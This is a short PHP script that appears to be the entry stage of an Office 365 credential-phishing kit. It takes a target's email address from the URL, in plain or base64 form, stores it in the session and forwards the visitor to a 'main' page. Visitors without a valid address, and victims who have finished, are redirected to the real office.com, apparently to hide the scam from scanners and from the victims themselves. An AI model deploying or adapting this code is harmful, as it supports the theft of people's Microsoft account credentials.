<?php 
session_start();
if(isset($_SESSION['finished'])){
	header("location: https://www.office.com");
	}
		if(isset($_GET['e'])){	
		
		if (filter_var($_GET['e'], FILTER_VALIDATE_EMAIL)) {
 	 	
		$email = $_GET['e'];
		$_SESSION['eml'] = $email;
		header("Location: main");
		
		}else {
		
		if (filter_var(base64_decode($_GET['e']), FILTER_VALIDATE_EMAIL)) {	
		
		$email = base64_decode($_GET['e']);
		$_SESSION['eml'] = $email;
		header("Location: main");
		
		} else {
			
		header("Location: https://www.office.com");	
			
		}
			
			
			}
				
		}
		 else {
			header("Location: https://www.office.com");
			}


?>